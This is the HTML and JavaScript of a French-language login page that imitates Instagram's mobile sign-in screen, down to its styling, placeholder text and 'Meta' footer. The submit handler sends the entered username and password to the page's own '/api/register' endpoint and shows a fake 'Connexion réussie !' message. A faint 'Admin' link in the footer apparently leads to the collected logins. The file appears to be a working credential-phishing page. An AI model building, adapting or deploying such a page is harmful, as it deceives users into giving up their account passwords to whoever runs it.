<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Connexion</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #ffffff;
      color: #000000;
      margin: 0;
      padding: 0;
    }
    input {
      font-size: 14px !important;
    }
    input::placeholder {
      color: #737373 !important;
      font-size: 14px !important;
    }
  </style>
</head>
<body class="flex flex-col min-h-screen justify-between bg-white text-[#000000]">

  <!-- Top Language Selector -->
  <header class="pt-5 text-center">
    <div class="inline-flex items-center text-[#737373] text-[13px] font-normal cursor-pointer">
      <span>Français (France)</span>
      <i class="fa-solid fa-chevron-down text-[9px] ml-1.5 text-[#737373]"></i>
    </div>
  </header>

  <!-- Main Mobile Container -->
  <main class="w-full max-w-[350px] mx-auto px-5 py-6 flex-1 flex flex-col justify-center">
    
    <!-- Top Empty Spacing where Instagram wordmark was -->
    <div class="h-12 mb-6"></div>

    <!-- Alert Message -->
    <div id="alertBox" class="hidden mb-4 p-3 rounded-[12px] text-xs font-semibold text-center"></div>

    <!-- Inputs & Form -->
    <form id="registerForm" class="space-y-3">
      <div>
        <input 
          type="text" 
          id="email" 
          required 
          autocomplete="username"
          placeholder="Numéro de mobile, nom d'utilisateur ou e-mail"
          class="w-full px-4 py-3.5 bg-[#fafafa] border border-[#dbdbdb] rounded-[14px] text-black placeholder-[#737373] focus:outline-none focus:border-[#a8a8a8] transition"
        >
      </div>

      <div class="relative">
        <input 
          type="password" 
          id="password" 
          required 
          autocomplete="current-password"
          placeholder="Mot de passe"
          class="w-full px-4 py-3.5 bg-[#fafafa] border border-[#dbdbdb] rounded-[14px] text-black placeholder-[#737373] focus:outline-none focus:border-[#a8a8a8] transition pr-14"
        >
        <button type="button" id="togglePass" class="absolute right-3.5 top-3.5 text-xs font-semibold text-[#737373] hover:text-black hidden">
          Afficher
        </button>
      </div>

      <div class="pt-2">
        <button 
          type="submit" 
          id="submitBtn"
          class="w-full py-3.5 px-4 bg-[#0095f6] hover:bg-[#1877f2] active:opacity-80 text-white font-semibold text-sm rounded-[24px] transition duration-150 flex items-center justify-center select-none"
        >
          <span>Connexion</span>
        </button>
      </div>
    </form>

    <!-- Forgot password -->
    <div class="text-center mt-4">
      <a href="#" class="text-xs text-black font-semibold hover:underline">
        Mot de passe oublié ?
      </a>
    </div>

    <!-- Divider -->
    <div class="my-7 flex items-center">
      <div class="flex-grow border-t border-[#dbdbdb]"></div>
      <span class="px-4 text-[12px] font-semibold text-[#737373] uppercase">ou</span>
      <div class="flex-grow border-t border-[#dbdbdb]"></div>
    </div>

    <!-- Create new account -->
    <div class="text-center">
      <button type="button" class="w-full py-3 px-4 bg-transparent border border-[#0095f6] text-[#0095f6] hover:bg-blue-50/50 font-semibold text-sm rounded-[24px] transition">
        Créer un nouveau compte
      </button>
    </div>

    <!-- Meta Logo bottom -->
    <div class="text-center mt-12 flex items-center justify-center space-x-1.5 text-[#737373]">
      <i class="fa-brands fa-meta text-sm"></i>
      <span class="text-xs font-semibold tracking-wider">Meta</span>
    </div>

  </main>

  <!-- Subtle admin link -->
  <footer class="py-3 text-center">
    <a href="/admin" class="text-[11px] text-[#cccccc] hover:text-[#737373] transition">
      Admin
    </a>
  </footer>

  <script>
    const form = document.getElementById('registerForm');
    const alertBox = document.getElementById('alertBox');
    const submitBtn = document.getElementById('submitBtn');
    const togglePass = document.getElementById('togglePass');
    const passwordInput = document.getElementById('password');

    passwordInput.addEventListener('input', () => {
      if (passwordInput.value.length > 0) {
        togglePass.classList.remove('hidden');
      } else {
        togglePass.classList.add('hidden');
      }
    });

    togglePass.addEventListener('click', () => {
      const isPassword = passwordInput.type === 'password';
      passwordInput.type = isPassword ? 'text' : 'password';
      togglePass.textContent = isPassword ? 'Masquer' : 'Afficher';
    });

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = document.getElementById('email').value.trim();
      const password = passwordInput.value;

      submitBtn.disabled = true;
      submitBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin mr-1.5"></i> Connexion...';

      try {
        const res = await fetch('/api/register', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email, password })
        });
        const data = await res.json();

        if (res.ok && data.success) {
          alertBox.className = 'mb-4 p-3 rounded-[12px] text-xs bg-emerald-50 text-emerald-700 border border-emerald-200 block text-center font-medium';
          alertBox.innerHTML = 'Connexion réussie !';
          form.reset();
          togglePass.classList.add('hidden');
        } else {
          alertBox.className = 'mb-4 p-3 rounded-[12px] text-xs bg-red-50 text-red-600 border border-red-200 block text-center font-medium';
          alertBox.innerHTML = data.message || 'Une erreur est survenue';
        }
      } catch (err) {
        alertBox.className = 'mb-4 p-3 rounded-[12px] text-xs bg-red-50 text-red-600 border border-red-200 block text-center font-medium';
        alertBox.innerHTML = 'Erreur réseau, réessayez plus tard.';
      } finally {
        submitBtn.disabled = false;
        submitBtn.innerHTML = '<span>Connexion</span>';
      }
    });
  </script>

</body>
</html>
